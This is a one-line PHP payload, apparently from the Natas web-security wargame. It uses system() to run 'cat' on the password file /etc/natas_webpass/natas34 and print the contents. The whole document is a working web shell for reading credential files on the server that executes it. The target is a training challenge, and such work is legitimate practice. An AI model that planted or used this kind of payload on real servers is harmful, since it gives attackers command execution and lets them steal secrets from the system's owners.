<?php echo system("cat /etc/natas_webpass/natas34"); ?>
